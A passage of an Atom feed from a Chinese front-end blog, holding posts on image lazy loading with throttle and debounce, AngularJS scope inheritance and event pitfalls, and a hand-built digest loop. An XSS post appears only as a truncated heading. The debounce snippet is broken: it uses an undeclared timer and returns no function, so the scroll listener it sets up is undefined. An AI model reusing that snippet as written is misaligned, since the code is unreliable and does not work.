      &lt;h1 id=&quot;xss-跨站脚本攻击&quot;&gt;&lt;a href=&quot;#xss-跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;xss 跨站脚本攻击&quot;&gt;&lt;/a&gt;xss 跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>懒加载</title>
    <link href="http://yoohannah.github.io/post/knowledge/lazyload.html"/>
    <id>http://yoohannah.github.io/post/knowledge/lazyload.html</id>
    <published>2017-11-30T23:55:15.000Z</published>
    <updated>2017-12-28T00:17:32.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function lazyload() &#123;</div><div class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</div><div class="line">              const len = images.length</div><div class="line">              let n = 0</div><div class="line">              return function() &#123;</div><div class="line">                  console.log(1)</div><div class="line">                  const seeHeight = document.documentElement.clientHeight</div><div class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</div><div class="line">                  for (let i = n; i &lt; len; i++) &#123;</div><div class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</div><div class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</div><div class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</div><div class="line">                          &#125;</div><div class="line">                          n = n + 1</div><div class="line">                      &#125;</div><div class="line">                  &#125;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          var loadImages = lazyload()</div><div class="line">          window.onload = function () &#123;</div><div class="line">              loadImages()</div><div class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</div><div class="line">          &#125;</div></pre></td></tr></table></figure></p>
<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function throttle(fn, delay, atleast) &#123;</div><div class="line">                let timeout = null</div><div class="line">                let startTime = new Date()</div><div class="line">                return function() &#123;</div><div class="line">                    const curTime = new Date()</div><div class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</div><div class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</div><div class="line">                        fn()</div><div class="line">                        startTime = curTime</div><div class="line">                    &#125; else &#123;</div><div class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function debounced(fn,delay) &#123;</div><div class="line">  clearTimeout(timeoutID);  // reset timer</div><div class="line">  timeoutID = setTimeout(function() &#123;</div><div class="line">    // wait for some time</div><div class="line">    // and check if event happens again</div><div class="line">    fn()</div><div class="line">  &#125;, delay);</div><div class="line">&#125;;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="external">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;lazy&quot;&gt;&lt;a href=&quot;#lazy&quot; class=&quot;headerlink&quot; title=&quot;lazy&quot;&gt;&lt;/a&gt;lazy&lt;/h1&gt;&lt;h2 id=&quot;图片lazyload&quot;&gt;&lt;a href=&quot;#图片lazyload&quot; class=&quot;headerlink&quot; titl
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>AngularJS issue</title>
    <link href="http://yoohannah.github.io/post/knowledge/angularissue.html"/>
    <id>http://yoohannah.github.io/post/knowledge/angularissue.html</id>
    <published>2017-10-31T08:33:15.000Z</published>
    <updated>2017-10-31T15:20:02.435Z</updated>
    
    <content type="html"><![CDATA[<p>#$digest和$apply</p>
<p>当调用$digest的时候，只触发当前作用域和它的子作用域上的监控，但是当调用$apply的时候，会触发作用域树上的所有监控。</p>
<p>因此，从性能上讲，如果能确定自己作的这个数据变更所造成的影响范围，应当尽量调用$digest，只有当无法精确知道数据变更造成的影响范围时，才去用$apply，很暴力地遍历整个作用域树，调用其中所有的监控。</p>
<h1 id="视图模型的层次"><a href="#视图模型的层次" class="headerlink" title="视图模型的层次"></a>视图模型的层次</h1><p>在Angular中，存在作用域的继承。所谓作用域的继承，是指：如果两个视图有包含关系，内层视图对应的作用域可以共享外层视图作用域的数据。<br>以下情况会造成嵌套作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">// 1. controller 套嵌</div><div class="line">如果两个控制器所对应的视图存在上下级关系，它们的作用域就自动产生继承关系</div><div class="line">html:</div><div class="line">&lt;body ng-app=&quot;test&quot;&gt;</div><div class="line">    &lt;div ng-controller=&quot;OuterCtrl&quot;&gt;//父域</div><div class="line">        &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;div ng-controller=&quot;InnerCtrl&quot;&gt;//子域</div><div class="line">            &lt;span ng-bind=&quot;a&quot;&gt;&lt;/span&gt;</div><div class="line">            &lt;span ng-bind=&quot;b&quot;&gt;&lt;/span&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">js:</div><div class="line">var app = angular.module(&quot;test&quot;, []);</div><div class="line"></div><div class="line">app.controller(&quot;OuterCtrl&quot;, function ($scope) &#123;</div><div class="line">    $scope.a = 1;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.controller(&quot;InnerCtrl&quot;, function ($scope) &#123;</div><div class="line">    $scope.b = 100;</div><div class="line"></div><div class="line">    $scope.increasea = function() &#123;</div><div class="line">        $scope.a++;</div><div class="line">    &#125;;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">//2.数组和对象属性迭代的时候,循环的每个元素都建立了单独的作用域</div><div class="line">&lt;ul&gt;</div><div class="line">    &lt;li ng-repeat=&quot;member in members&quot;&gt;&#123;&#123;member.name&#125;&#125; in &#123;&#123;teamname&#125;&#125;&lt;/li&gt; //每一个都是子域，但可以共享父域的teamname</div><div class="line">&lt;/ul&gt;</div><div class="line"></div><div class="line">//3.使用ng-if,ng-include,ng-view等指令时构建的DOM，会形成自己的子域</div><div class="line"></div><div class="line">inner.html</div><div class="line">&lt;div&gt;</div><div class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</div><div class="line">&lt;/div&gt;</div><div class="line"></div><div class="line">outer.html</div><div class="line">&lt;div ng-controller=&quot;OuterCtrl&quot;&gt;</div><div class="line">    &lt;span ng-bind=&quot;name&quot;&gt;&lt;/span&gt;</div><div class="line">    &lt;div ng-include=&quot;&apos;inner.html&apos;&quot;&gt;&lt;/div&gt;//ng-include会创建一层作用域，inner.html里面bind的name会使用OuterCtrl这个父域里面的name</div><div class="line">&lt;/div&gt;</div><div class="line">function OuterCtrl($scope) &#123;</div><div class="line">    $scope.name = &quot;outer name&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>作用域继承的缺点就是，子域绑定值能继承父域同名绑定值的值，但是一旦子域绑定值，因为某种触发函数发生改变，父域同名绑定值不会随之改变<br>虽然可以通过$parent获取父域的同名绑定值，然后子域中做到同时修改，但如果在代码中使用了这种方式，意味着视图模型也只能这样包含，如果再中间插一层子域，<br>则同名关系变成$parent.$parent，使关系进一步复杂<br>所以，应当尽量避免父子作用域存在同名变量的情况</p>
<p>从可重用性角度来看，如果满分5分的话，整个应用的这些部分的得分应当是这样：</p>
<p>服务，比如说，对后端RESTful接口的AJAX调用，对本地存储的访问等，5分<br>控制器（也就是视图模型），2-3分<br>指令，这个要看情况，有的指令是当作对HTML元素体系的扩展来用的，有些是其他事情的<br>纯UI类型的指令，也可以算是控件，比如DatetimePicker，5分<br>有些用于沟通DOM跟视图模型的指令，2分<br>界面模板，这个基本就没有重用性了，1分</p>
<h1 id="模块机制-module的坑"><a href="#模块机制-module的坑" class="headerlink" title="模块机制-module的坑"></a>模块机制-module的坑</h1><p>1.覆盖问题<br>如果moduleA,同时依赖moduleB和moduleC,而moduleB和moduleC有同名的factoryD,那在moduleA使用factoryD的时候，<br>根据依赖顺序，如果moduleB在前，则moduleC的factoryD会覆盖moduleB的factoryD，moduleA使用的是moduleC的factoryD<br>如果在以上依赖情况基础上，moduleA自己又定义了同名factoryD,那么moduleA自己的factoryD会覆盖moduleC的factoryD</p>
<p>2.module不支持运行时添加依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">angular.module(&quot;some.components&quot;, [])</div><div class="line">    //这里定义了一些组件</div><div class="line">    ;</div><div class="line">//上面是一个组件库，集中存放于components.js中，要在自己的应用中使用，必须：</div><div class="line">angular.module(&quot;our.app&quot;, [&quot;some.components&quot;]);</div><div class="line"></div><div class="line">//不可以这样</div><div class="line">angular.module(&quot;our.app&quot;, []);</div><div class="line"></div><div class="line">require(&quot;components.js&quot;, function() &#123;</div><div class="line">    // angular.module(&quot;our.app&quot;).addDependency(&quot;some.components&quot;);</div><div class="line">    // ready to use</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p>1.在绑定表达式里面，只能使用自定义函数，不能使用原生函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div&gt;&#123;&#123;abs(-1)&#125;&#125;&lt;/div&gt;//不允许这样使用</div></pre></td></tr></table></figure></p>
<p>如果确实需要调用原生函数，可以用一个自定义函数作包装，在自定义函数里面可以随意使用各种原生对象<br>绑定表达式里可以使用自定义函数，但如果只是对数据做简单处理可以使用过滤器</p>
<p>2.数组里有重复元素的情况，ng-repeat代码不能起作用，原因是Angular默认需要在数组中使用唯一索引<br>可以指定它使用序号作索引<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$scope.arr2 = [1, 1, 3];</div><div class="line">&lt;ul&gt;</div><div class="line">    &lt;li ng-repeat=&quot;item in arr2 track by $index&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/li&gt;</div><div class="line">&lt;/ul&gt;</div></pre></td></tr></table></figure></p>
<p>但对象值有重复的话，不用像数组那么麻烦需要指定$index做索引，因为它是对象的key做索引，是不会重复的。</p>
<h1 id="事件流"><a href="#事件流" class="headerlink" title="事件流"></a>事件流</h1><p>angular事件流是一个通知广播的过程<br>现有A、B两个视图，每个视图又包含各自两个子视图，如果A视图的A1子视图想通知B视图的子视图B1一个业务事件(或传递某个消息)<br>那A1就发出业务通知，这个通知会沿着父作用域一路往上到达双方共同的祖先作用域<br>然后这个通知会以广播的形式从祖先作用域一级一级往下进行广播，直到到达需要的地方<br><img src="/image/angularissue.png" alt="issue1"><br>相关事件：<br>从作用域往上发送事件，使用scope.$emit。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$scope.$emit(&quot;someEvent&quot;, &#123;&#125;);</div></pre></td></tr></table></figure></p>
<p>从作用域往下发送事件，使用scope.$broadcast<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$scope.$broadcast(&quot;someEvent&quot;, &#123;&#125;);</div></pre></td></tr></table></figure></p>
<p>这两个方法的第二个参数是要随事件带出的数据。<br>这两种方式传播事件，事件的发送方自己也会收到一份。<br>无论是$emit还是$broadcast发送的事件，都可以被接收，接收这两种事件的方式是一样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    // 这里从e上可以取到发送过来的数据</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>如果想要阻止$emit事件的继续传播，可以调用事件对象的stopPropagation()方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    e.stopPropagation();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>想要阻止$broadcast事件的传播,首先，调用事件对象的preventDefault()方法，<br>然后，在收取这个事件对象的时候，判断它的defaultPrevented属性，如果为true，就忽略此事件。<br>这个过程比较麻烦，其实一般是不需要管的，只要不监听对应的事件就可以了。<br>在实际使用过程中，也应当尽量少使用事件的广播，尤其是从较高的层级进行广播<br>上级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    e.preventDefault();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>下级作用域<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$scope.$on(&quot;someEvent&quot;, function(e) &#123;</div><div class="line">    if (e.defaultPrevented) &#123;</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<h2 id="事件总线"><a href="#事件总线" class="headerlink" title="事件总线"></a>事件总线</h2><p>事件流的通知过程效率低，而且很多下级视图可能根本不要接收消息，进行多余的广播，<br>所以组建订阅发布模式，接收方在这里订阅消息，发布方在这里发布消息，这个地方就是事件总线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">app.factory(&quot;EventBus&quot;, function() &#123;</div><div class="line">    var eventMap = &#123;&#125;;</div><div class="line"></div><div class="line">    var EventBus = &#123;</div><div class="line">        on : function(eventType, handler) &#123; //订阅事件</div><div class="line">            //multiple event listener</div><div class="line">            if (!eventMap[eventType]) &#123;</div><div class="line">                eventMap[eventType] = [];</div><div class="line">            &#125;</div><div class="line">            eventMap[eventType].push(handler);</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">        off : function(eventType, handler) &#123;</div><div class="line">            for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</div><div class="line">                if (eventMap[eventType][i] === handler) &#123;</div><div class="line">                    eventMap[eventType].splice(i, 1);</div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line"></div><div class="line">        fire : function(event) &#123; //发布事件</div><div class="line">            var eventType = event.type;</div><div class="line">            if (eventMap &amp;&amp; eventMap[eventType]) &#123;</div><div class="line">                for (var i = 0; i &lt; eventMap[eventType].length; i++) &#123;</div><div class="line">                    eventMap[eventType][i](event);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line">    return EventBus;</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#$digest和$apply&lt;/p&gt;
&lt;p&gt;当调用$digest的时候，只触发当前作用域和它的子作用域上的监控，但是当调用$apply的时候，会触发作用域树上的所有监控。&lt;/p&gt;
&lt;p&gt;因此，从性能上讲，如果能确定自己作的这个数据变更所造成的影响范围，应当尽量调用$dig
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>AngularJS Digest</title>
    <link href="http://yoohannah.github.io/post/knowledge/angular-digest.html"/>
    <id>http://yoohannah.github.io/post/knowledge/angular-digest.html</id>
    <published>2017-10-28T08:33:15.000Z</published>
    <updated>2017-10-28T11:19:58.135Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>通常angularjs 环境中变量都绑定在Scope对象上，检测这些变量变化的机制也绑定在该对象上</p>
<p>为了检测数据发生变化，所以为每一个变量创建监听器<br>监听器包含两部分内容<br>一个监控函数,负责前后数据对比<br>一个监听函数，规定对数据变化做出什么响应</p>
<p>但是监听器需要有机制进行触发才能发挥作用<br>即调用监控函数，看数据是否发生变化，然后根据结果再调用监听函数，对变化做出响应</p>
<p>因此，在Scope对象上挂载函数和属性实现以上机制</p>
<p>Scope.$$watchers = []    用于保存注册过的所有监听器</p>
<p>Scope.prototype.$watch = function(watchFn, listenerFn) {} 用于将监控函数和监听函数组合成监听器，然后保存到$$watchers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn) &#123;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,//监控函数</div><div class="line">    listenerFn: listenerFn || function() &#123; &#125; //监听函数</div><div class="line">  &#125;;</div><div class="line">  this.$$watchers.push(watcher);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Scope.prototype.$$digestOnce = function() {}<br>具体的脏检查过程，初始化变更标记，遍历一遍$$watchers，<br>如果某个数据发生变化就执行对应监听函数，<br>并将变更标记设置true返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$digestOnce = function() &#123;</div><div class="line">  var self  = this;</div><div class="line">  var dirty;</div><div class="line">  _.forEach(this.$$watchers, function(watch) &#123;</div><div class="line">    var newValue = watch.watchFn(self);</div><div class="line">    var oldValue = watch.last;</div><div class="line">    if (newValue !== oldValue) &#123;</div><div class="line">      watch.listenerFn(newValue, oldValue, self);</div><div class="line">      dirty = true;</div><div class="line">    &#125;</div><div class="line">    watch.last = newValue;</div><div class="line">  &#125;);</div><div class="line">  return dirty;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Scope.prototype.$digest = function() {} 循环执行检测，保证监控器内部对属性进行的变更也能被检测到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$digest = function() &#123;</div><div class="line">  var ttl = 10;</div><div class="line">  var dirty;</div><div class="line">  do &#123;</div><div class="line">    dirty = this.$$digestOnce();</div><div class="line">    if (dirty &amp;&amp; !(ttl--)) &#123;</div><div class="line">      throw &quot;10 digest iterations reached&quot;;</div><div class="line">    &#125;</div><div class="line">  &#125; while (dirty);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>如果仅执行一次digest，检测不到B监听器监听函数修改的A监听器监听的属性新值，<br>因此进行持续遍历所有监听器，直到监控的值停止变更<br>$digest为$$digestOnce包裹一个do-while“外层循环”，<br>如果第一次运行完，有监控值发生变更了，标记为dirty，所有监听器再运行第二次。这会一直运行，直到所有监控的值都不再变化，整个局面稳定下来了。<br>如果两个监听器互相监控了对方产生的变更，状态始终不会稳定，因此添加迭代数量ttl，限制迭代次数，保证循环检测的可控性，达到ttl就抛异常</p>
<h1 id="对于新旧值的判断-areEqual"><a href="#对于新旧值的判断-areEqual" class="headerlink" title="对于新旧值的判断 - $$areEqual"></a>对于新旧值的判断 - $$areEqual</h1><p>$$digestOnce中使用！==判断新旧值，可以判断值的引用但无法判断值的变更<br>因此在监控器里增加字段valueEq，用来定制判断方法，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$watch = function(watchFn, listenerFn, valueEq) &#123;</div><div class="line">  var watcher = &#123;</div><div class="line">    watchFn: watchFn,</div><div class="line">    listenerFn: listenerFn,</div><div class="line">    valueEq: !!valueEq</div><div class="line">  &#125;;</div><div class="line">  this.$$watchers.push(watcher);</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>定制判断方法,抽离成函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$areEqual = function(newValue, oldValue, valueEq) &#123;</div><div class="line">  if (valueEq) &#123;</div><div class="line">    return _.isEqual(newValue, oldValue);</div><div class="line">  &#125; else &#123;</div><div class="line">    return newValue === oldValue ||</div><div class="line">      (typeof newValue === &apos;number&apos; &amp;&amp; typeof oldValue === &apos;number&apos; &amp;&amp;</div><div class="line">       isNaN(newValue) &amp;&amp; isNaN(oldValue));//对NaN特殊情况进行处理</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>判断方法发生改变，进而存储方法也要根据判断方式进行改变<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Scope.prototype.$$digestOnce = function() &#123;</div><div class="line">  var self  = this;</div><div class="line">  var dirty;</div><div class="line">  _.forEach(this.$$watchers, function(watch) &#123;</div><div class="line">    var newValue = watch.watchFn(self);</div><div class="line">    var oldValue = watch.last;</div><div class="line">    if (!self.$$areEqual(newValue, oldValue, watch.valueEq)) &#123;</div><div class="line">      watch.listenerFn(newValue, oldValue, self);</div><div class="line">      dirty = true;</div><div class="line">    &#125;</div><div class="line">    watch.last = (watch.valueEq ? _.cloneDeep(newValue) : newValue); //定制存储方式</div><div class="line">  &#125;);</div><div class="line">  return dirty;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Angular默认不使用基于值的脏检测的原因，用户需要显式设置这个标记去打开它。</p>
<h1 id="集成外部代码与digest循环-apply"><a href="#集成外部代码与digest循环-apply" class="headerlink" title="集成外部代码与digest循环-$apply"></a>集成外部代码与digest循环-$apply</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//$eval使用一个函数作参数，所做的事情是立即执行这个传入的函数，并且把作用域自身当作参数传递给它，</div><div class="line">//返回的是这个函数的返回值。$eval也可以有第二个参数，它所做的仅仅是把这个参数传递给这个函数。</div><div class="line">Scope.prototype.$eval = function(expr, locals) &#123;</div><div class="line">  return expr(this, locals);</div><div class="line">&#125;;</div><div class="line">//$apply可以执行一些与Angular无关的代码(expr)，这些代码也还是可以改变作用域上的东西，</div><div class="line">//$apply可以保证作用域上的监听器可以检测这些变更。</div><div 